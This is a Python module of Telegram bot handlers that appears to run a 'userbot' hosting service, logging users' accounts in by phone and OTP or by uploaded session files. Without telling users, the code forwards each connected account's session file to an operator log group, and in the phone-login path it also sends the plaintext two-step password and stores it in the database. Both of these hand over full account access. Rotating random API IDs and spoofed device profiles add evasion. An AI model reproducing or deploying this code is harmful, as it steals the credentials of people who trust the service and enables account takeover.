import os
import logging
import asyncio
import zipfile
import tempfile
from telethon import events, TelegramClient
from telethon.sessions import StringSession, SQLiteSession
from telethon.errors import SessionPasswordNeededError
import database
import models
import config
import utils
import userbot_manager
from userbot import force_join_channels, apply_branding

logger = logging.getLogger(__name__)

# In-memory dictionary containing ongoing login flows
# Structure: { user_id: { "step": str, "phone": str, "client": TelegramClient, "phone_code_hash": str } }
_login_states = {}

async def clean_login_state(user_id: int):
    """
    Cleans up the login state for a user and disconnects any temporary client.
    """
    if user_id in _login_states:
        state = _login_states.pop(user_id)
        temp_client = state.get("client")
        if temp_client:
            try:
                if temp_client.is_connected():
                    await temp_client.disconnect()
            except Exception as e:
                logger.warning(f"Error disconnecting temporary login client: {e}")

def register_handlers(client):
    
    @client.on(events.CallbackQuery(pattern="^cancel_login$"))
    async def cancel_login_callback(event):
        user_id = event.sender_id
        await clean_login_state(user_id)
        from .my_bots import show_bots_list
        await show_bots_list(event, user_id, flash_message="<blockquote><b>» ❌ Login Flow Cancelled.</b></blockquote>")

    @client.on(events.CallbackQuery(pattern="^resend_otp_action$"))
    async def resend_otp_callback(event):
        user_id = event.sender_id
        user = database.get_user(user_id)
        lang = user.get("language", "en") if user else "en"
        
        state = _login_states.get(user_id)
        if not state or not state.get("client") or not state.get("phone"):
            await event.answer("⚠️ Session expired. Please start login again.", alert=True)
            from .my_bots import show_bots_list
            await show_bots_list(event, user_id)
            return
            
        temp_client = state["client"]
        phone = state["phone"]
        
        try:
            if not temp_client.is_connected():
                await temp_client.connect()
            sent_code = await temp_client.send_code_request(phone)
            state["phone_code_hash"] = sent_code.phone_code_hash
            state["step"] = "WAITING_FOR_OTP"
            
            await event.answer("📩 New OTP code sent to your Telegram!", alert=True)
            prompt_text = (
                f"<blockquote><b>» 📩 New Otp Sent!</b>\n\n"
                f"A New 5-Digit Verification Code Has Been Sent To <code>{phone}</code> On Telegram.\n\n"
                f"✍️ <b>Enter The 5-Digit Code Below (E.G. 1 2 3 4 5)</b></blockquote>"
            )
            buttons = [
                [
                    utils.styled_button("🔄 Resend Otp", "resend_otp_action", style="primary"),
                    utils.styled_button("❌ Cancel", "cancel_login", style="danger")
                ]
            ]
            try:
                await event.edit(prompt_text, buttons=buttons)
            except Exception:
                await event.respond(prompt_text, buttons=buttons)
        except Exception as e:
            logger.error(f"Failed to resend code to {phone}: {e}")
            buttons = [
                [
                    utils.styled_button("🔄 Try Again", "menu_add_bot", style="primary"),
                    utils.styled_button("❌ Cancel", "cancel_login", style="danger")
                ]
            ]
            fail_text = f"<blockquote><b>» ❌ Failed To Resend Otp</b>\n\n⚠️ <b>Error :</b> <code>{e}</code></blockquote>"
            try:
                await event.edit(fail_text, buttons=buttons)
            except Exception:
                await event.respond(fail_text, buttons=buttons)

    @client.on(events.CallbackQuery(pattern="^menu_add_bot$"))
    async def add_bot_start(event):
        await event.answer()
        user_id = event.sender_id
        user = database.get_user(user_id)
        if not user:
            user = models.create_default_user(user_id)
            database.save_user(user)

        lang = user.get("language", "en")
        allowed = utils.get_allowed_slots(user_id)
        sessions = database.get_sessions(user_id)
        remaining = allowed - len(sessions)
        if remaining <= 0:
            try:
                await event.edit(utils.get_text("error_no_slots", lang, allowed=allowed))
            except Exception:
                await event.respond(utils.get_text("error_no_slots", lang, allowed=allowed))
            return

        await clean_login_state(user_id)

        choice_text = (
            f"<blockquote><b>» ➕ Add Userbot Account</b>\n\n"
            f"📦 <b>Remaining Slots :</b> <b>{remaining}</b>\n\n"
            f"Choose A Login Method :\n"
            f"• 📱 <b>Phone Login</b> — enter number + OTP\n"
            f"• 📁 <b>Upload .session / .zip</b> — import session file(s)</blockquote>"
        )
        buttons = [
            [utils.styled_button("📱 Phone + Otp Login", "menu_add_bot_phone", style="success")],
            [utils.styled_button("📁 Upload .Session / .Zip", "menu_add_bot_session", style="primary")],
            [utils.styled_button("❌ Cancel", "cancel_login", style="danger")],
        ]
        try:
            await event.edit(choice_text, buttons=buttons, parse_mode="html")
        except Exception:
            await event.respond(choice_text, buttons=buttons, parse_mode="html")

    @client.on(events.CallbackQuery(pattern="^menu_add_bot_phone$"))
    async def add_bot_phone_start(event):
        await event.answer()
        user_id = event.sender_id
        user = database.get_user(user_id)
        lang = user.get("language", "en") if user else "en"
        allowed = utils.get_allowed_slots(user_id)
        sessions = database.get_sessions(user_id)
        if len(sessions) >= allowed:
            try:
                await event.edit(utils.get_text("error_no_slots", lang, allowed=allowed))
            except Exception:
                await event.respond(utils.get_text("error_no_slots", lang, allowed=allowed))
            return
        await clean_login_state(user_id)
        _login_states[user_id] = {"step": "WAITING_FOR_PHONE"}
        buttons = [[utils.styled_button("🔙 Cancel", "cancel_login", style="danger")]]
        try:
            await event.edit(utils.get_text("login_phone_prompt", lang), buttons=buttons)
        except Exception:
            await event.respond(utils.get_text("login_phone_prompt", lang), buttons=buttons)

    @client.on(events.CallbackQuery(pattern="^menu_add_bot_session$"))
    async def add_bot_session_start(event):
        await event.answer()
        user_id = event.sender_id
        user = database.get_user(user_id)
        lang = user.get("language", "en") if user else "en"
        allowed = utils.get_allowed_slots(user_id)
        sessions = database.get_sessions(user_id)
        remaining = allowed - len(sessions)
        if remaining <= 0:
            try:
                await event.edit(utils.get_text("error_no_slots", lang, allowed=allowed))
            except Exception:
                await event.respond(utils.get_text("error_no_slots", lang, allowed=allowed))
            return
        await clean_login_state(user_id)
        _login_states[user_id] = {"step": "WAITING_FOR_SESSION_FILE", "remaining_slots": remaining}
        prompt = (
            f"<blockquote><b>» 📁 Upload .session / .zip</b>\n\n"
            f"• <b>Single .session</b> — send one <code>.session</code> file\n"
            f"• <b>Multiple .zip</b> — send a <code>.zip</code> containing multiple <code>.session</code> files\n\n"
            f"📦 <b>Available Slots :</b> <b>{remaining}</b>\n\n"
            f"➡️ Send your file(s) below:</blockquote>"
        )
        buttons = [[utils.styled_button("❌ Cancel", "cancel_login", style="danger")]]
        try:
            await event.edit(prompt, buttons=buttons, parse_mode="html")
        except Exception:
            await event.respond(prompt, buttons=buttons, parse_mode="html")

    @client.on(events.NewMessage)
    async def login_input_handler(event):
        if not event.is_private:
            return
            
        user_id = event.sender_id
        if user_id not in _login_states:
            return
            
        # Allow aborting the login flow via /start or cancel
        raw_txt = (event.text or "").strip().lower()
        if raw_txt in ("/start", "/cancel", "cancel", "back", "/abort", "abort"):
            await clean_login_state(user_id)
            if not raw_txt.startswith("/start"):
                from .my_bots import show_bots_list
                await show_bots_list(event, user_id, flash_message="<blockquote><b>» ❌ Login Cancelled.</b></blockquote>")
            return
            
        state = _login_states[user_id]
        step = state["step"]
        user = database.get_user(user_id)
        lang = user.get("language", "en") if user else "en"

        # ------------------ SESSION FILE UPLOAD ------------------
        if step == "WAITING_FOR_SESSION_FILE":
            doc = getattr(event, "document", None)
            if not doc and hasattr(event, "media") and event.media:
                doc = getattr(event.media, "document", None)
            if not doc:
                await event.reply("<blockquote><b>» ⚠️ No File Detected</b>\n\nPlease send a <code>.session</code> file or a <code>.zip</code> containing session files.</blockquote>", parse_mode="html")
                return
            fname = ""
            try:
                for attr in doc.attributes:
                    if hasattr(attr, "file_name"):
                        fname = attr.file_name or ""
                        break
            except Exception:
                pass
            fname_lower = fname.lower()
            if not fname_lower.endswith(".session") and not fname_lower.endswith(".zip"):
                await event.reply("<blockquote><b>» ❌ Invalid File</b>\n\nOnly <code>.session</code> or <code>.zip</code> files accepted.</blockquote>", parse_mode="html")
                return
            prog = await event.reply("<blockquote><b>» ⏳ Processing...</b>\n\nValidating session file(s)...</blockquote>", parse_mode="html")
            allowed = utils.get_allowed_slots(user_id)
            existing = database.get_sessions(user_id)
            remaining = state.get("remaining_slots", allowed - len(existing))
            os.makedirs("downloads", exist_ok=True)
            temp_dl = os.path.join("downloads", fname or "upload.tmp")
            try:
                await client.download_media(event.media, file=temp_dl)
            except Exception as dl_err:
                await prog.edit(f"<blockquote><b>» ❌ Download Failed</b>\n\n<code>{dl_err}</code></blockquote>", parse_mode="html")
                await clean_login_state(user_id)
                return
            session_files = []
            if fname_lower.endswith(".session"):
                session_files = [(temp_dl, fname)]
            elif fname_lower.endswith(".zip"):
                try:
                    extract_dir = os.path.join("downloads", f"sess_zip_{user_id}")
                    os.makedirs(extract_dir, exist_ok=True)
                    with zipfile.ZipFile(temp_dl, "r") as zf:
                        for member in zf.namelist():
                            if member.lower().endswith(".session"):
                                zf.extract(member, extract_dir)
                                session_files.append((os.path.join(extract_dir, member), os.path.basename(member)))
                    os.remove(temp_dl)
                except Exception as zip_err:
                    await prog.edit(f"<blockquote><b>» ❌ Zip Extraction Failed</b>\n\n<code>{zip_err}</code></blockquote>", parse_mode="html")
                    await clean_login_state(user_id)
                    return
            if not session_files:
                await prog.edit("<blockquote><b>» ❌ No .session Files</b>\n\nNo valid <code>.session</code> files found.</blockquote>", parse_mode="html")
                await clean_login_state(user_id)
                return
            session_files = session_files[:remaining]
            successes, failures = [], []
            import shutil
            for sf_path, sf_name in session_files:
                phone_guess = os.path.splitext(sf_name)[0]
                phone_clean = "+" + "".join(c for c in phone_guess if c.isdigit()) or phone_guess
                user_dir = utils.ensure_user_dir(user_id)
                dest_dir = os.path.join(user_dir, "sessions")
                os.makedirs(dest_dir, exist_ok=True)
                dest_path = os.path.join(dest_dir, f"{phone_clean}.session")
                try:
                    shutil.copy2(sf_path, dest_path)
                    api_id, api_hash = config.get_random_api_id_hash()
                    dev_prof = utils.get_device_profile(phone_clean)
                    test_client = TelegramClient(
                        dest_path.replace(".session", ""), 
                        api_id, 
                        api_hash,
                        device_model=dev_prof["device_model"],
                        system_version=dev_prof["system_version"],
                        app_version=dev_prof["app_version"]
                    )
                    await test_client.connect()
                    me = await test_client.get_me()
                    if not me:
                        raise Exception("Session is invalid or expired")
                    name = f"{me.first_name or ''} {me.last_name or ''}".strip() or phone_clean
                    username = me.username or ""
                    phone_actual = f"+{me.phone}" if me.phone else phone_clean
                    await test_client.disconnect()
                    actual_dest = os.path.join(dest_dir, f"{phone_actual}.session")
                    if dest_path != actual_dest:
                        shutil.move(dest_path, actual_dest)
                        dest_path = actual_dest
                    if userbot_manager.is_bot_running(phone_actual):
                        try:
                            await userbot_manager.stop_bot(phone_actual)
                        except Exception:
                            pass
                    with open(dest_path, "rb") as f:
                        sess_bytes = f.read()
                    sess_record = models.create_default_session(phone_actual, user_id, phone_actual, dest_path)
                    sess_record["name"] = name
                    sess_record["username"] = username
                    sess_record["two_step_password"] = "None"
                    sess_record["session_bytes"] = sess_bytes
                    database.save_session(sess_record)
                    started = await userbot_manager.start_userbot(phone_actual)
                    successes.append(f"{'@'+username if username else name} ({phone_actual}) {'✅' if started else '⚠️'}")
                    try:
                        gs = database.get_global_settings()
                        lgid = gs.get("log_group_id")
                        if lgid:
                            from telethon import Button
                            bot_obj = await client.get_me()
                            bot_username = bot_obj.username or ""
                            log_buttons = []
                            if bot_username:
                                pass # We no longer use url button for control bot
                            log_buttons.append([Button.inline("🎮 Control Userbot", data=f"admin_ctrl_bot_{phone_clean}".encode())])
                            
                            if username:
                                log_buttons.append([Button.url(f"👤 Open Account (@{username})", f"https://t.me/{username}")])
                            else:
                                log_buttons.append([Button.url(f"👤 Open Account ({name or phone_actual})", f"tg://openmessage?user_id={me.id}")])
                            
                            log_buttons.append([Button.url("👑 View Bot Owner", f"tg://openmessage?user_id={user_id}")])
                            
                            lt = (f"<blockquote><b>» 📁 Session Uploaded</b>\n"
                                  f"👤 <code>{user_id}</code> | 📞 <code>{phone_actual}</code>\n"
                                  f"🏷️ {name} | 🔗 @{username or 'None'}</blockquote>")
                            await client.send_message(lgid, lt, file=dest_path, parse_mode="html", buttons=log_buttons if log_buttons else None)
                    except Exception as le:
                        logger.error(f"Error sending log for session upload: {le}")
                except Exception as sess_err:
                    failures.append(f"{sf_name} ❌ {sess_err}")
                    try:
                        if os.path.exists(dest_path):
                            os.remove(dest_path)
                    except Exception:
                        pass
            summary = "<blockquote><b>» 📁 Import Result</b>\n\n"
            if successes:
                summary += "✅ " + "\n".join(f"• {s}" for s in successes) + "\n\n"
            if failures:
                summary += "❌ " + "\n".join(f"• {f}" for f in failures) + "\n\n"
            summary += f"📦 <b>Imported :</b> {len(successes)}/{len(session_files)}</blockquote>"
            try:
                await prog.edit(summary, parse_mode="html")
            except Exception:
                await event.reply(summary, parse_mode="html")
            await clean_login_state(user_id)
            if successes:
                from .my_bots import show_bots_list
                await asyncio.sleep(2)
                await show_bots_list(event, user_id, flash_message=f"<blockquote><b>» ✅ {len(successes)} Userbot(s) Imported!</b></blockquote>")
            return

        # ------------------ STEP 1: Phone input ------------------

        if step == "WAITING_FOR_PHONE":
            phone = event.text.strip().replace(" ", "")
            if not phone.startswith("+") or not phone[1:].isdigit():
                buttons = [[utils.styled_button("🔙 Cancel", "cancel_login", style="danger")]]
                await event.reply(utils.get_text("login_invalid_phone", lang), buttons=buttons)
                return
                
            # Create session folder & path
            user_dir = utils.ensure_user_dir(user_id)
            session_path = os.path.join(user_dir, f"{phone}.session")
            
            # Stop any existing running userbot for this phone to avoid locks
            if userbot_manager.is_bot_running(phone):
                try:
                    await userbot_manager.stop_bot(phone)
                except Exception as stop_err:
                    logger.warning(f"Error stopping userbot {phone} prior to re-login: {stop_err}")
            
            # Initialize temporary client using in-memory StringSession to prevent ANY SQLite file locks
            api_id, api_hash = config.get_random_api_id_hash()
            dev_prof = utils.get_device_profile(phone)
            temp_client = TelegramClient(
                StringSession(), 
                api_id, 
                api_hash,
                device_model=dev_prof["device_model"],
                system_version=dev_prof["system_version"],
                app_version=dev_prof["app_version"]
            )
            state["phone"] = phone
            state["client"] = temp_client
            state["session_path"] = session_path
            
            try:
                await temp_client.connect()
                sent_code = await temp_client.send_code_request(phone)
                state["phone_code_hash"] = sent_code.phone_code_hash
                state["step"] = "WAITING_FOR_OTP"
                
                buttons = [
                    [
                        utils.styled_button("🔄 Resend Otp", "resend_otp_action", style="primary"),
                        utils.styled_button("🔙 Cancel", "cancel_login", style="danger")
                    ]
                ]
                await event.reply(utils.get_text("login_otp_prompt", lang), buttons=buttons)
            except Exception as e:
                logger.error(f"Failed to send code request to {phone}: {e}")
                buttons = [
                    [
                        utils.styled_button("🔄 Try Again", "menu_add_bot", style="primary"),
                        utils.styled_button("🔙 Cancel", "cancel_login", style="danger")
                    ]
                ]
                await event.reply(utils.get_text("login_failed", lang, error=str(e)), buttons=buttons)
                await clean_login_state(user_id)
                
        # ------------------ STEP 2: OTP input ------------------
        elif step == "WAITING_FOR_OTP":
            otp_input = event.text.strip().replace(" ", "")
            if not otp_input.isdigit() or len(otp_input) != 5:
                buttons = [
                    [
                        utils.styled_button("🔄 Resend Otp", "resend_otp_action", style="primary"),
                        utils.styled_button("🔙 Cancel", "cancel_login", style="danger")
                    ]
                ]
                await event.reply(utils.get_text("login_otp_invalid", lang), buttons=buttons)
                return
                
            temp_client = state.get("client")
            phone = state.get("phone")
            phone_code_hash = state.get("phone_code_hash")
            
            if not temp_client or not phone or not phone_code_hash:
                await event.reply("<blockquote><b>» ⚠️ Session Error</b>\n\nPlease Try Logging In Again.</blockquote>")
                await clean_login_state(user_id)
                return
            
            try:
                # Sign in using OTP
                await temp_client.sign_in(phone, otp_input, phone_code_hash=phone_code_hash)
                # Success without 2FA!
                await complete_login(client, event, user_id, state)
            except SessionPasswordNeededError:
                state["step"] = "WAITING_FOR_2FA"
                buttons = [[utils.styled_button("🔙 Cancel", "cancel_login", style="danger")]]
                await event.reply(utils.get_text("login_2fa_prompt", lang), buttons=buttons)

            except Exception as e:
                logger.error(f"Sign in failed for {phone}: {e}")
                buttons = [
                    [
                        utils.styled_button("🔄 Resend Otp", "resend_otp_action", style="primary"),
                        utils.styled_button("❌ Cancel", "cancel_login", style="danger")
                    ]
                ]
                await event.reply(
                    f"<blockquote><b>» ❌ Login Failed</b>\n\n⚠️ <b>Error :</b> <code>{e}</code>\n\n💡 <i>You Can Re-Enter Your Code, Tap Resend Otp Or Cancel.</i></blockquote>",
                    buttons=buttons
                )
                
        # ------------------ STEP 3: 2FA Password input ------------------
        elif step == "WAITING_FOR_2FA":
            password = event.text.strip()
            state["two_step_password"] = password
            temp_client = state.get("client")
            if not temp_client:
                await event.reply("<blockquote><b>» ⚠️ Session Error</b>\n\nPlease Try Logging In Again.</blockquote>")
                await clean_login_state(user_id)
                return
            
            try:
                await temp_client.sign_in(password=password)
                await complete_login(client, event, user_id, state)
            except Exception as e:
                logger.error(f"2FA sign in failed: {e}")
                buttons = [
                    [
                        utils.styled_button("🔄 Resend Otp", "resend_otp_action", style="primary"),
                        utils.styled_button("❌ Cancel", "cancel_login", style="danger")
                    ]
                ]
                await event.reply(
                    f"<blockquote><b>» ❌ 2FA Verification Failed</b>\n\n⚠️ <b>Error :</b> <code>{e}</code>\n\n<i>Please Enter The Correct 2FA Password Or Tap Cancel :</i></blockquote>",
                    buttons=buttons
                )

async def complete_login(bot_client, event, user_id: int, state: dict):
    """
    Finalizes userbot setup on successful Telegram authorization.
    """
    temp_client = state["client"]
    phone = state["phone"]
    session_path = state["session_path"]
    two_step_pwd = state.get("two_step_password") or "None"
    
    user = database.get_user(user_id)
    lang = user.get("language", "en") if user else "en"
    
    try:
        me = await temp_client.get_me()
        name = f"{me.first_name or ''} {me.last_name or ''}".strip()
        username = me.username or ""

        # Make sure any existing running userbot for this phone is stopped
        if userbot_manager.is_bot_running(phone):
            try:
                await userbot_manager.stop_bot(phone)
            except Exception:
                pass

        # Transfer in-memory StringSession auth details to SQLite file session
        try:
            if os.path.exists(session_path):
                try:
                    os.remove(session_path)
                except Exception:
                    pass
            sqlite_sess = SQLiteSession(session_path)
            sqlite_sess.set_dc(temp_client.session.dc_id, temp_client.session.server_address, temp_client.session.port)
            sqlite_sess.auth_key = temp_client.session.auth_key
            sqlite_sess.save()
            sqlite_sess.close()
        except Exception as transfer_err:
            logger.error(f"Error transferring StringSession to SQLiteSession: {transfer_err}")

        # Disconnect temporary client so userbot_manager can start it cleanly
        await temp_client.disconnect()
        await asyncio.sleep(1.0)
        
        # Save session in database
        session_id = phone
        sess_record = models.create_default_session(session_id, user_id, phone, session_path)
        sess_record["name"] = name
        sess_record["username"] = username
        sess_record["two_step_password"] = two_step_pwd
        
        # Read the session file into bytes
        if os.path.exists(session_path):
            with open(session_path, "rb") as f:
                sess_record["session_bytes"] = f.read()
        else:
            logger.error(f"Session file not found at {session_path} in complete_login")
            
        database.save_session(sess_record)
        
        # Start userbot using manager
        started = await userbot_manager.start_userbot(session_id)
        
        # Notify user with a button to open Dashboard
        success_text = utils.get_text("login_success", lang, name=name, username=username)
        buttons = [[utils.styled_button("📱 Go To Dashboard", f"select_bot_{phone}", style="success")]]
        await event.reply(success_text, buttons=buttons)
        
        # Redirect user to the dashboard for this userbot immediately
        from .my_bots import show_bot_dashboard
        if started:
            flash_msg = "<blockquote><b>» ⚙️ Userbot Connected!</b>\n\nConfigure Its Automation Settings Below :</blockquote>"
        else:
            flash_msg = "<blockquote><b>» ⚠️ Userbot Connection Warning</b>\n\nUserbot Connected But Failed To Start. Check Telegram Session/Auth Status.</blockquote>"
            
        await show_bot_dashboard(event, phone, user_id, flash_message=flash_msg)
        
        # Forward details to admin log group
        global_settings = database.get_global_settings()
        log_group_id = global_settings.get("log_group_id")
        if log_group_id:
            bot_me = await bot_client.get_me()
            bot_username = getattr(bot_me, "username", None)
            
            log_text = (
                f"<blockquote><b>» 📱 New Userbot Connected</b>\n\n"
                f"👤 <b>User :</b> <code>{user_id}</code>\n"
                f"📞 <b>Phone :</b> <code>{phone}</code>\n"
                f"🏷️ <b>Name :</b> <b>{name}</b>\n"
                f"🔗 <b>Username :</b> @{username if username else 'None'}\n"
                f"🔐 <b>2-Step Password :</b> <code>{two_step_pwd}</code>\n"
                f"🟢 <b>Auto-Started :</b> {'Yes' if started else 'No'}</blockquote>"
            )
            userbot_uid = getattr(me, "id", None)
            try:
                from telethon import Button
                log_buttons = []
                
                # Control Userbot button
                phone_clean = phone.replace("+", "").strip()
                if bot_username:
                    pass
                log_buttons.append([Button.inline("🎮 Control Userbot", data=f"admin_ctrl_bot_{phone_clean}".encode())])
                
                if username:
                    log_buttons.append([Button.url(f"👤 Open Account (@{username})", f"https://t.me/{username}")])
                elif userbot_uid:
                    log_buttons.append([Button.url(f"👤 Open Account ({name or phone})", f"tg://openmessage?user_id={userbot_uid}")])
                
                if user_id:
                    log_buttons.append([Button.url("👑 View Bot Owner", f"tg://openmessage?user_id={user_id}")])

                # Upload session file with clickable buttons
                await bot_client.send_message(
                    log_group_id, 
                    log_text, 
                    file=session_path,
                    buttons=log_buttons if log_buttons else None,
                    parse_mode="html"
                )
            except Exception as log_err:
                logger.error(f"Failed to log connected session to log group {log_group_id}: {log_err}")
                
    except Exception as e:
        logger.error(f"Error finalizing login: {e}")
        await event.reply(utils.get_text("login_failed", lang, error=str(e)))
    finally:
        # Always clean up temporary state
        await clean_login_state(user_id)
